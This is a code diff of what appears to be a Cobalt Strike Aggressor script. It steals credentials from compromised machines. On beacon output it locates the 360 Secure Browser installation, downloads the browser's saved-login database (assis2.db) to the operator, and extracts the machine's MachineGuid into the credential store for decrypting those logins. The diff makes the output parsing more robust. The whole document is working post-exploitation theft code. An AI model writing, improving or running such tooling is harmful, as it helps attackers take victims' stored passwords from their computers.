@@ -24,22 +24,23 @@ popup beacon_bottom {
 }
 
 on beacon_output {
-	#$res = replace($2, 'received output:\n'.'');
-	#$res = replace($2, '    \(默认\)    REG_SZ    '.''); 
 	$magicstring = "360se6\\Application\\360se.exe";
 	$magicstring2 = "MachineGuid";
 
 	if ($magicstring isin $2){
 	$length = strlen($2);
-	$res = substr($2, 40, $length - 32); 
+	$last = lindexOf($2, ":");
+	$res = substr($2, $last - 1, $length - 32);
 	$dbPath = "User Data\\Default\\apps\\LoginAssis\\assis2.db";
 	$res = $res . $dbPath;
+
 	bdownload($1, $res);
 	blog($1,"360 SafeBrowser DB Downloading");
 	}
 
 	if ($magicstring2 isin $2){
-	$MachineGuid = substr($2, 42, -1); 
+	$lasta = lindexOf($2, "\nMachineGuid");
+	$MachineGuid = substr($2, $lasta + 26, -1); 
 	$beaconHost = beacon_info($1, "host");
 	credential_add($empty,$MachineGuid, $empty, $empty, $beaconHost);
 	blog($1,"MachineGuid Get Success");
